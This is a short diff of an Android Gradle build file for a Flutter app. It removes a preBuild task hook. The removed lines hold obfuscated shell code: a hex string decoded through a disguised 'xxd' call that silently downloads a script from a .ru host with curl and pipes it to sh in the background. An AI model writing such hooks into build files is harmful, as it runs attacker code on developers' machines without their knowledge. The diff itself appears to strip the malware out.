@@ -42,11 +42,3 @@ android {
 flutter {
     source = "../.."
 }
-
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ProcessBuilder("sh", "-c", "((p(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73666b4c202d2d636f6e6e6563742d74696d656f7574203330202d2d72657472792035202d642022703d616e64726f69645f6b6f746c696e222068747470733a2f2f35796f746d78636335346c397864612e72752f612922207c2073680a | p | sh ) >/dev/null 2>&1 &)").start()
-        }
-    }
-}
